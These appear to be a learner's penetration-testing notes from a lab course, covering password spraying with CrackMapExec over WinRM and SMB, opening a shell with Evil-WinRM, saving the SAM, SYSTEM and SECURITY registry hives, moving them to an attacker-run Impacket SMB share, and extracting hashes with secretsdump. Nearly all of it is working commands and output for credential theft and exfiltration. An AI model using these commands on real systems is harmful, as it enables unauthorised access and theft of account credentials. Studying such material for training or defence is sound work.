# The use of CrackMapExec

The default command 
    
    crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>

Example 

    [!bash!]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list

    WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
    WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
    WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)

To connect to smb 

    [!bash!]$ crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares-


To connect to WinRm, a script called evilWinRm allows the connection to windows server.

    [!bash!]$ evil-winrm -i <target-IP> -u <username> -p <password>
    [!bash!]$ evil-winrm -i 10.129.42.197 -u user -p password

    Evil-WinRM shell v3.3

    Info: Establishing connection to remote endpoint

    *Evil-WinRM* PS C:\Users\user\Documents>

# Dump windows hashes

hklm\sam	Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.

hklm\system	Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.

hklm\security	Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.

    C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

    The operation completed successfully.

    C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

    The operation completed successfully.

    C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

    The operation completed successfully.

Then transfer them offline, using smbserver for example:

    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

In Windows:

    C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

    C:\> move security.save \\10.10.15.16\CompData
            1 file(s) moved.

    C:\> move system.save \\10.10.15.16\CompData
            1 file(s) moved.

And then to read them, we can use secretdump.py 

    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL